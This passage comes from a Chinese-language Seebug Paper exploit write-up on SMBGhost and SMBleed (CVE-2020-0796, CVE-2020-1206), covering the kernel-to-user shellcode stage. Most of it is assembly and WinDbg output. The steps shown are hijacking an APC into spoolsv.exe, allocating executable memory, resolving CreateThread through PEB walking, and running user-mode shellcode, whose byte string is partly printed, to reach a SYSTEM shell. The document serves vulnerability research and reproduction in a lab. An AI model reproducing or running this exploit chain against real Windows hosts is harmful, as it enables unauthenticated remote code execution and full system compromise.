   +0x028 RundownRoutine   : (null) 
   +0x030 NormalRoutine    : 0xfffff780`00000e00     void  +fffff78000000e00
   +0x020 Reserved         : [3] 0xfffff780`00000a62 Void
   +0x038 NormalContext    : 0xfffff780`00000e00 Void
   +0x040 SystemArgument1  : (null) 
   +0x048 SystemArgument2  : (null) 
   +0x050 ApcStateIndex    : 0 ''
   +0x051 ApcMode          : 1 ''
   +0x052 Inserted         : 0 ''

kd> u 0xfffff780`00000a62    //KernelRoutine
fffff780`00000a62 55              push    rbp
fffff780`00000a63 53              push    rbx
fffff780`00000a64 57              push    rdi
fffff780`00000a65 56              push    rsi
fffff780`00000a66 4157            push    r15
fffff780`00000a68 498b28          mov     rbp,qword ptr [r8]
fffff780`00000a6b 4c8b7d08        mov     r15,qword ptr [rbp+8]
fffff780`00000a6f 52              push    rdx

```

*   nt!KeInsertQueueApc 然后通过 nt!KeInsertQueueApc 函数将初始化后的 APC 对象存放到目标线程的 APC 队列中。

```
; BOOLEAN KeInsertQueueApc(PKAPC, SystemArgument1, SystemArgument2, 0);
    ;   SystemArgument1 is second argument in usermode code (rdx)
    ;   SystemArgument2 is third argument in usermode code (r8)
    lea rcx, [rbp+DATA_KAPC_OFFSET]
    ;xor edx, edx   ; no need to set it here
    ;xor r8, r8     ; no need to set it here
    xor r9, r9
    mov edi, KEINSERTQUEUEAPC_HASH
    call win_api_direct

kd> dt _kapc fffff78000000e30
nt!_KAPC
   +0x000 Type             : 0x12 ''
   +0x001 SpareByte0       : 0 ''
   +0x002 Size             : 0x58 'X'
   +0x003 SpareByte1       : 0 ''
   +0x004 SpareLong0       : 0
   +0x008 Thread           : 0xffffca8d`178e9080 _KTHREAD
   +0x010 ApcListEntry     : _LIST_ENTRY [ 0xffffca8d`178e9128 - 0xffffca8d`178e9128 ]
   +0x020 KernelRoutine    : 0xfffff780`00000a62     void  +fffff78000000a62
   +0x028 RundownRoutine   : (null) 
   +0x030 NormalRoutine    : 0xfffff780`00000e00     void  +fffff78000000e00
   +0x020 Reserved         : [3] 0xfffff780`00000a62 Void
   +0x038 NormalContext    : 0xfffff780`00000e00 Void
   +0x040 SystemArgument1  : 0x0000087f`fffff200 Void
   +0x048 SystemArgument2  : (null) 
   +0x050 ApcStateIndex    : 0 ''
   +0x051 ApcMode          : 1 ''
   +0x052 Inserted         : 0x1 ''

```

然后判断 KAPC.ApcListEntry 中 UserApcPending 比特位是否被设置，如果成功，就等待目标线程获得权限，执行 APC 例程，执行 KernelApcRoutine 函数。

```
    mov rax, [rbp+DATA_KAPC_OFFSET+0x10]     ; get KAPC.ApcListEntry
    ; EPROCESS pointer 8 bytes
    ; InProgressFlags 1 byte
    ; KernelApcPending 1 byte
    ; * Since Win10 R5:
    ;   Bit 0: SpecialUserApcPending
    ;   Bit 1: UserApcPending
    ; if success, UserApcPending MUST be 1
    test byte [rax+0x1a], 2
    jnz _insert_queue_apc_done

kd> p
fffff780`000009e7 f6401a02        test    byte ptr [rax+1Ah],2

kd> dt _kapc fffff78000000e30
nt!_KAPC
   +0x000 Type             : 0x12 ''
   +0x001 SpareByte0       : 0 ''
   +0x002 Size             : 0x58 'X'
   +0x003 SpareByte1       : 0 ''
   +0x004 SpareLong0       : 0
   +0x008 Thread           : 0xffffca8d`178e9080 _KTHREAD
   +0x010 ApcListEntry     : _LIST_ENTRY [ 0xffffca8d`178e9128 - 0xffffca8d`178e9128 ]

kd> dx -id 0,0,ffffca8d10ea3340 -r1 (*((ntkrnlmp!_LIST_ENTRY *)0xfffff78000000e40))
(*((ntkrnlmp!_LIST_ENTRY *)0xfffff78000000e40))                 [Type: _LIST_ENTRY]
    [+0x000] Flink            : 0xffffca8d178e9128 [Type: _LIST_ENTRY *]
    [+0x008] Blink            : 0xffffca8d178e9128 [Type: _LIST_ENTRY *]

kd> db rax l1a+1
ffffca8d`178e9128  40 0e 00 00 80 f7 ff ff-40 0e 00 00 80 f7 ff ff  @.......@.......
ffffca8d`178e9138  40 e2 cb 18 8d ca ff ff-00 00 02                 @..........

```

### KernelApcRoutine 函数

在这个函数里先将 IRQL 设置为 PASSIVE_LEVEL（通过在 KernelApcRoutine 中将 cr8 置 0），以便调用 ZwAllocateVirtualMemory 函数。 + 申请空间并复制用户态 Shellcode 调用 ZwAllocateVirtualMemory(-1, &baseAddr, 0, &0x1000, 0x1000, 0x40) 分配内存，然后将用户态 Shellcode 复制过去。如下所示，分配到的地址为 bc0000。

```
kd> dd rdx l1
fffffe80`766458d0  00000000
kd> dd fffffe80`766458d0 l1    //baseAddr
fffffe80`766458d0  00bc0000

kd> u rip  //将用户模式代码复制到bc0000处：
fffff780`00000aa5 488b3e          mov     rdi,qword ptr [rsi]
fffff780`00000aa8 488d354d000000  lea     rsi,[fffff780`00000afc]
fffff780`00000aaf b980030000      mov     ecx,380h
fffff780`00000ab4 f3a4            rep movs byte ptr [rdi],byte ptr [rsi]

kd> u bc0000
00000000`00bc0000 4892            xchg    rax,rdx
00000000`00bc0002 31c9            xor     ecx,ecx
00000000`00bc0004 51              push    rcx
00000000`00bc0005 51              push    rcx
00000000`00bc0006 4989c9          mov     r9,rcx
00000000`00bc0009 4c8d050d000000  lea     r8,[00000000`00bc001d]
00000000`00bc0010 89ca            mov     edx,ecx
00000000`00bc0012 4883ec20        sub     rsp,20h

```

*   查找 kernel32 模块 思路是通过遍历之前找到的 "spoolsv.exe" 的 PEB 结构中的 Ldr->InMemoryOrderModuleList->Flink，找到 kernel32 模块（unicode 字符串特征比对）。 PEB 偏移 0x18 为_PEB_LDR_DATA 结构的 Ldr ，其偏移 0x20 处为一个_LIST_ENTRY 结构的 InMemoryOrderModuleList，_LIST_ENTRY 结构中包含 flink 和 blink 指针，通过遍历 flink 指针可以查询不同模块的 LDR_DATA_TABLE_ENTRY 结构。

```
1: kd> dt _peb @rax
nt!_PEB
   +0x000 InheritedAddressSpace : 0 ''
   +0x001 ReadImageFileExecOptions : 0 ''
   +0x002 BeingDebugged    : 0 ''
   +0x003 BitField         : 0x4 ''
   +0x003 ImageUsesLargePages : 0y0
   +0x003 IsProtectedProcess : 0y0
   +0x003 IsImageDynamicallyRelocated : 0y1
   +0x003 SkipPatchingUser32Forwarders : 0y0
   +0x003 IsPackagedProcess : 0y0
   +0x003 IsAppContainer   : 0y0
   +0x003 IsProtectedProcessLight : 0y0
   +0x003 IsLongPathAwareProcess : 0y0
   +0x004 Padding0         : [4]  ""
   +0x008 Mutant           : 0xffffffff`ffffffff Void
   +0x010 ImageBaseAddress : 0x00007ff7`94970000 Void
   +0x018 Ldr              : 0x00007fff`ea7a53c0 _PEB_LDR_DATA
   +0x020 ProcessParameters : 0x00000000`012c1bc0 _RTL_USER_PROCESS_PARAMETERS
   +0x028 SubSystemData    : (null) 
   +0x030 ProcessHeap      : 0x00000000`012c0000 Void
   ......
1: kd> dx -id 0,0,ffff818c698db380 -r1 ((ntkrnlmp!_PEB_LDR_DATA *)0x7fffea7a53c0)
((ntkrnlmp!_PEB_LDR_DATA *)0x7fffea7a53c0)                 : 0x7fffea7a53c0 [Type: _PEB_LDR_DATA *]
    [+0x000] Length           : 0x58 [Type: unsigned long]
    [+0x004] Initialized      : 0x1 [Type: unsigned char]
    [+0x008] SsHandle         : 0x0 [Type: void *]
    [+0x010] InLoadOrderModuleList [Type: _LIST_ENTRY]
    [+0x020] InMemoryOrderModuleList [Type: _LIST_ENTRY]
    [+0x030] InInitializationOrderModuleList [Type: _LIST_ENTRY]
    [+0x040] EntryInProgress  : 0x0 [Type: void *]
    [+0x048] ShutdownInProgress : 0x0 [Type: unsigned char]
    [+0x050] ShutdownThreadId : 0x0 [Type: void *]
1: kd> dx -id 0,0,ffff818c698db380 -r1 (*((ntkrnlmp!_LIST_ENTRY *)0x7fffea7a53e0))
(*((ntkrnlmp!_LIST_ENTRY *)0x7fffea7a53e0))                 [Type: _LIST_ENTRY]
    [+0x000] Flink            : 0x12c2580 [Type: _LIST_ENTRY *]
    [+0x008] Blink            : 0x1363920 [Type: _LIST_ENTRY *]

```

LDR_DATA_TABLE_ENTRY 结构偏移 0x30 处为模块基址，偏移 0x58 处为 BaseDllName，其起始处为模块名的 unicode 长度（两个字节），偏移 0x8 处为该模块的 unicode 字符串。通过长度和字符串这两个特征可以定位 kernel32 模块，并通过 DllBase 字段获取基址。在实际操作中需要计算这些地址相对于 InMemoryOrderLinks 的偏移。

```
1: kd> dt _LDR_DATA_TABLE_ENTRY 0x12c2b00
nt!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000000`012c30f0 - 0x00000000`012c23e0 ]
   +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000000`012c3100 - 0x00000000`012c23f0 ]
   +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000000`012c45b0 - 0x00000000`012c3110 ]
   +0x030 DllBase          : 0x00007fff`e8ab0000 Void
   +0x038 EntryPoint       : 0x00007fff`e8ac7c70 Void
   +0x040 SizeOfImage      : 0xb2000
   +0x048 FullDllName      : _UNICODE_STRING "C:\Windows\System32\KERNEL32.DLL"
   +0x058 BaseDllName      : _UNICODE_STRING "KERNEL32.DLL"

1: kd> dx -id 0,0,ffff818c698db380 -r1 -nv (*((ntkrnlmp!_UNICODE_STRING *)0x12c2b58))
(*((ntkrnlmp!_UNICODE_STRING *)0x12c2b58))                 : "KERNEL32.DLL" [Type: _UNICODE_STRING]
    [+0x000] Length           : 0x18 [Type: unsigned short]
    [+0x002] MaximumLength    : 0x1a [Type: unsigned short]
    [+0x008] Buffer           : 0x12c2cb8 : "KERNEL32.DLL" [Type: wchar_t *]

```

然后在 kernel32 模块的导出表中寻找 CreateThread 函数，然后将其保存至 KernelApcRoutine 函数的参数 SystemArgument1 中，传送给 userland_start_thread。

```
; save CreateThread address to SystemArgument1
mov [rbx], rax

kd> dq rbx l1
fffffe80`766458e0  00000000`00001000

kd> p
fffff780`00000aea 31c9            xor     ecx,ecx

kd> dq fffffe80`766458e0 l1
fffffe80`766458e0  00007ffa`d229a810

kd> u 7ffa`d229a810
KERNEL32!CreateThreadStub:
00007ffa`d229a810 4c8bdc          mov     r11,rsp
00007ffa`d229a813 4883ec48        sub     rsp,48h
00007ffa`d229a817 448b542470      mov     r10d,dword ptr [rsp+70h]
00007ffa`d229a81c 488b442478      mov     rax,qword ptr [rsp+78h]
00007ffa`d229a821 4181e204000100  and     r10d,10004h
00007ffa`d229a828 498943f0        mov     qword ptr [r11-10h],rax
00007ffa`d229a82c 498363e800      and     qword ptr [r11-18h],0
00007ffa`d229a831 458953e0        mov     dword ptr [r11-20h],r10d

```

然后将 QUEUEING_KAPC 置 0，将 IRQL 恢复至 APC_LEVEL。

```
_kernel_kapc_routine_exit:
    xor ecx, ecx
    ; clear queueing kapc flag, allow other hijacked system call to run shellcode
    mov byte [rbp+DATA_QUEUEING_KAPC_OFFSET], cl
    ; restore IRQL to APC_LEVEL
    mov cl, 1
    mov cr8, rcx

```

### 用户态 Shellcode

最终成功运行到用户模式 Shellcode，用户模式代码包含 userland_start_thread 和功能 Shellcode（userland_payload），在 userland_start_thread 中通过调用 CreateThread 函数去执行功能 Shellcode。userland_payload 这里不再介绍。

```
userland_start_thread:
    ; CreateThread(NULL, 0, &threadstart, NULL, 0, NULL)
    xchg rdx, rax   ; rdx is CreateThread address passed from kernel
    xor ecx, ecx    ; lpThreadAttributes = NULL
    push rcx        ; lpThreadId = NULL
    push rcx        ; dwCreationFlags = 0
    mov r9, rcx     ; lpParameter = NULL
    lea r8, [rel userland_payload]  ; lpStartAddr
    mov edx, ecx    ; dwStackSize = 0
    sub rsp, 0x20
    call rax
    add rsp, 0x30
    ret

userland_payload:
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52......"

kd> u r8
00000000`00bc001d fc              cld
00000000`00bc001e 4883e4f0        and     rsp,0FFFFFFFFFFFFFFF0h
00000000`00bc0022 e8c0000000      call    00000000`00bc00e7
00000000`00bc0027 4151            push    r9
00000000`00bc0029 4150            push    r8
00000000`00bc002b 52              push    rdx
00000000`00bc002c 51              push    rcx
00000000`00bc002d 56              push    rsi

```

### **总结~**

本文对公开的关于 SMBGhost 和 SMBleed 漏洞的几种利用思路进行跟进，逆向了一些关键结构和算法特性，最终在实验环境下拿到了 System Shell。非常感谢 blackwhite 和 zcgonvh 两位师傅，在此期间给予的指导和帮助，希望有天能像他们一样优秀。最后放上两种利用思路的复现结果：

![](https://images.seebug.org/content/images/2020/09/85e82776-b432-441a-b66f-20d17fb7c2c6.png-w331s)

![](https://images.seebug.org/content/images/2020/09/4e9ac958-f4c1-4568-9374-dae7e1d9d59d.png-w331s)

### **参考文献**

*   [https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796)
    
*   [https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1206](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1206)
    
*   [https://ricercasecurity.blogspot.com/2020/04/ill-ask-your-body-smbghost-pre-auth-rce.html](https://ricercasecurity.blogspot.com/2020/04/ill-ask-your-body-smbghost-pre-auth-rce.html)
    
*   [https://blog.zecops.com/vulnerabilities/smbleedingghost-writeup-chaining-smbleed-cve-2020-1206-with-smbghost/](https://blog.zecops.com/vulnerabilities/smbleedingghost-writeup-chaining-smbleed-cve-2020-1206-with-smbghost/)
    
*   [https://blog.zecops.com/vulnerabilities/smbleedingghost-writeup-part-ii-unauthenticated-memory-read-preparing-the-ground-for-an-rce/](https://blog.zecops.com/vulnerabilities/smbleedingghost-writeup-part-ii-unauthenticated-memory-read-preparing-the-ground-for-an-rce/)
    
*   [https://blog.zecops.com/vulnerabilities/smbleedingghost-writeup-part-iii-from-remote-read-smbleed-to-rce/](https://blog.zecops.com/vulnerabilities/smbleedingghost-writeup-part-iii-from-remote-read-smbleed-to-rce/)
    
*   [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/e7046961-3318-4350-be2a-a8d69bb59ce8](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/e7046961-3318-4350-be2a-a8d69bb59ce8)
    
*   [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/f1d9b40d-e335-45fc-9d0b-199a31ede4c3](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/f1d9b40d-e335-45fc-9d0b-199a31ede4c3)
    
*   [https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update.pdf](https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update.pdf)
    
*   [https://mp.weixin.qq.com/s/rKJdP_mZkaipQ9m0Qn9_2Q](https://mp.weixin.qq.com/s/rKJdP_mZkaipQ9m0Qn9_2Q)
    
*   [https://mp.weixin.qq.com/s/71c6prw14AWYYJXf4-QXMA](https://mp.weixin.qq.com/s/71c6prw14AWYYJXf4-QXMA)
    
*   [https://mp.weixin.qq.com/s/hUi0z37dbF9o06kKf8gQyw](https://mp.weixin.qq.com/s/hUi0z37dbF9o06kKf8gQyw)
    

![](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg) 本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：[https://paper.seebug.org/1346/](https://paper.seebug.org/1346/)